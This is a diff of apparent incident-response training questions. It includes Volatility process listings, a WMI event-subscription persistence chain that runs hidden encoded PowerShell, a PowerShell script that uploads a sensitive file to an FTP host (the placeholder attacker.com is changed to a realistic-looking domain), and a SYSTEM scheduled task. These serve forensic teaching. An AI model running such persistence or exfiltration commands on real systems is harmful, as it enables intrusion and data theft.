@@ -13,8 +13,6 @@ Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Star
 0x822a57a8 lsass.exe               680    624     23      358      0      0 2023-06-23 16:14:53 UTC+0000
 0x822b63a1 lsass.exe               932    1444     2       30      0      0 2023-06-23 16:34:33 UTC+0000
 0x82069490 vmacthlp.exe            848    668      1       25      0      0 2023-06-23 16:14:53 UTC+0000
-0x82146990 svchost.exe             880    668     18      202      0      0 2023-06-23 16:14:53 UTC+0000
-0x8204b128 svchost.exe             992    668     11      272      0      0 2023-06-23 16:14:53 UTC+0000
 0x82219850 svchost.exe            1136    668     84     1614      0      0 2023-06-23 16:14:53 UTC+0000
 0x8228f020 scvhost.exe            2980    668      5       77      0      0 2023-06-24 07:31:17 UTC+0000
 0x81e63ab8 svchost.exe            1220    668     15      218      0      0 2023-06-23 16:14:54 UTC+0000
@@ -63,7 +61,6 @@ Hex dump of first 64 bytes:
 2000030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
 
 Detected PE file header at 0x2000000 in process explorer.exe.
-Possible injected code or reflective loading detected!
 ```
 
 ## 5. During investigation of command line transcript you noticed below commands, can you explain what is going on?
@@ -71,8 +68,10 @@ Possible injected code or reflective loading detected!
 wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="EventFilter_MSEdgeUpdate", 
 Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'cmd.exe'", 
 QueryLanguage="WQL"
+
 wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="ExecuteUpdate", 
-CommandLineTemplate="powershell.exe -nop -w hidden -enc JAB0AGgAIAAiACQAcgBvAGcAIAAiAHwAIAAiAGwAMgAtAGIAcgBoAGQAZAAtAG8AdgBpAGQAZgAuAGYAbQAiAHwAIAAiAGwAMgAtAGIAcgBoAGQAZAAtAG8AdgBpAGQAZgAuAGYAbQAi" 
+CommandLineTemplate="powershell.exe -nop -w hidden -enc JAB0AGgAIAAiACQAcgBvAGcAIAAiAHwAIAAiAGwAMgAtAGIAcgBoAGQAZAAtAG8AdgBpAGQAZgAuAGYAbQAiAHwAIAAiAGwAMgAtAGIAcgBoAGQAZAAtAG8AdgBpAGQAZgAuAGYAbQAi"
+
 wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="\\\\.\\root\\subscription:__EventFilter.Name='EventFilter_MSEdgeUpdate'", 
 Consumer="\\\\.\\root\\subscription:CommandLineEventConsumer.Name='ExecuteUpdate'"
 ```
@@ -93,7 +92,7 @@ while ($true) {
 
 ## 6. Identify language and script purpose.
 ```
-$ftpServer = "ftp://attacker.com"
+$ftpServer = "ftp://free-backup-live.cn"
 $ftpUser = "attacker"
 $ftpPassword = "P@ssw0rd"
 $filePath = "C:\SensitiveData\ImportantFile.txt"
@@ -160,7 +159,7 @@ X-Spam-Status: Yes, score=8.5 required=5.0 tests=ALL_TRUSTED,HTML_MESSAGE,SPF_FA
 X-Phishing-Alert: Potential Phishing Attempt Detected
 ```
 
-## 10. You noticed that user executed following command, can it be dangerous?
+## 10. You received alert about following scheduled task, can it be dangerous?
 ```
 schtasks /create /tn "UpdateTask" /tr "C:\Windows\System32\cmd.exe /c C:\Users\Public\update.bat" /sc once /st 00:00 /ru SYSTEM
 ```
